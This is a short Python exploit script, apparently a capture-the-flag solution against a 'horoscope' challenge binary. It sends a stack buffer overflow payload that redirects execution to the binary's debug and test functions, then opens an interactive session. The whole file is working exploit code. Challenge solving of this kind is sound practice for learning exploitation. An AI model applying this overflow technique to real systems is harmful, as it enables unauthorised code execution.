#!/usr/bin/python3
# -*- coding: utf-8 -*-
# Author := 4n0nym4u5

from rootkit import *
from time import sleep

exe  = context.binary = ELF('./horoscope')
host = args.HOST or 'horoscope.sdc.tf'
port = int(args.PORT or 1337)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

libc=SetupLibcELF()
io = start()

padding = b"1/1/1/1/" + b"A"*48 + p(exe.sym.debug) + p(exe.sym.test)

re()
sl(padding)

io.interactive()
